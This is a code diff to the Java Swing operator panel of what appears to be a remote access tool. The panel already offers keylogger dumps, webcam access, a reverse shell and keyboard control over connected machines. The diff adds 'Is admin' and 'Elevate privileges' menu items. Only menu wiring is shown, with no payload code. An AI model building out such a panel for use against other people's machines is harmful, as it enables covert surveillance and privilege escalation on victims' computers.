@@ -9,6 +9,8 @@ import GUI.TableUtils.KeyLogger.KeyLoggerEventsListener;
 import GUI.TableUtils.KeyLogger.KeyLoggerMenuListener;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import GUI.TableUtils.KeyboardController.KeyboardControllerMenuListener;
+import GUI.TableUtils.Permissions.CheckAdmin.AdminPermissionAction;
+import GUI.TableUtils.Permissions.ElevatePermission.ElevatePermissionAction;
 import GUI.TableUtils.ReverseShell.ReverseShellMenuListener;
 import GUI.TableUtils.Webcam.WebcamMenuListener;
 
@@ -57,13 +59,18 @@ public class TablePopUpListener extends MouseAdapter {
         keyloggerMenuOptions.add(dumpLogsMenu);
         keyloggerMenuOptions.add(dumpAllLogsMenu);
         JMenuItem keyboardController = new JMenuItem("Keyboard controller");
-
+        JMenu permissionsMenu = new JMenu("Admin privileges");
+        JMenuItem isAdminMenu = new JMenuItem("Is admin");
+        JMenuItem elevatePrivilegesMenu = new JMenuItem("Elevate privileges");
+        permissionsMenu.add(isAdminMenu);
+        permissionsMenu.add(elevatePrivilegesMenu);
         // add to popup
         connectedPopUpMenu.add(fileManagerMenu);
         connectedPopUpMenu.add(webcamMenu);
         connectedPopUpMenu.add(reverseShellMenu);
         connectedPopUpMenu.add(keyloggerMenuOptions);
         connectedPopUpMenu.add(keyboardController);
+        connectedPopUpMenu.add(permissionsMenu);
 
 
         JTable connectionsTable = mainGUI.getConnectionsTable();
@@ -78,6 +85,8 @@ public class TablePopUpListener extends MouseAdapter {
         dumpLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_LAST));
         dumpAllLogsMenu.addActionListener(new KeyLoggerEventsListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP_ALL));
         keyboardController.addActionListener(new KeyboardControllerMenuListener(connectionsTable, mapOfConnections, mainGUI));
+        isAdminMenu.addActionListener(new AdminPermissionAction(connectionsTable,mapOfConnections));
+        elevatePrivilegesMenu.addActionListener(new ElevatePermissionAction(connectionsTable,mapOfConnections));
     }
 
     @Override
